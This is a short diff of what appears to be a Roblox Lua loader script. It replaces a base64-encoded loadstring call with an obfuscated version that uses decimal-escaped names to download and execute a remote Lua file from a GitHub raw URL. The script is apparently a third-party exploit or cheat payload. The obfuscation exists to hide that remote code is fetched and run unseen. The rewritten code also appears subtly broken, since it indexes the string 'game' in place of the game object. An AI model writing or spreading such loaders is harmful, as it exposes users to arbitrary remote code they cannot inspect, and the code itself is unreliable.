@@ -1,1 +1,6 @@
-loadstring(game:HttpGet('data:text/plain;base64,bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS90eXlneXlnNzc4LW1ha2VyL1JvYmxveC1zY3JpcHQvcmVmcy9oZWFkcy9tYWluL2Z1bGxjaHVjbmFuZy5sdWEiKSkoKQotLSBzd2c3eGNtbApsb2NhbCBqazh0ejYgPSAyNw=='))()
+local a="\108\111\97\100\115\116\114\105\110\103"
+local b="\103\97\109\101"
+local c="\72\116\116\112\71\101\116"
+
+local f=_G[a]
+f(b[c]("https://raw.githubusercontent.com/tyygyyg778-maker/Roblox-script/main/fullchucnang.lua"))()
